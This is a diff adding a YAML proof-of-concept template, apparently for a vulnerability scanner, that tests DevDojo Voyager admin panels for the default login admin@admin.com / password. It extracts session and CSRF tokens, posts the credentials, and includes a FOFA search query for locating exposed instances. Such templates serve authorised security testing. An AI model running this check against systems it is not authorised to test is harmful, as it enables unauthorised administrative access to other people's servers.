@@ -1,0 +1,26 @@
+id: poc-yaml-devdojo-voyager-default-login
+info:
+  name: DevDojo Voyager 默认用户登录漏洞
+  severity: high
+  tags:
+  - 配置不当
+  finger: voyager
+  fofa: title="Voyager"
+requests:
+- method: GET
+  path: /admin/login
+  expression: status_code == 200
+  output:
+  - regex_match(headers,"XSRF-TOKEN=(?P<xsrf_token>.*?);")
+  - regex_match(headers,"wave_session=(?P<session>.*?);")
+  - regex_match(body,`name="_token" value="(?P<csrf_token>.*?)"`)
+- method: POST
+  path: /admin/login
+  headers:
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+    Cookie: XSRF-TOKEN={{.xsrf_token}}; wave_session={{.session}}
+  data: _token={{.csrf_token}}&email=admin@admin.com&password=password&
+  expression: status_code == 302 && contains(body,"/admin</title>") && contains(body,"Redirecting
+    to")
+variables: {}
+transport: http
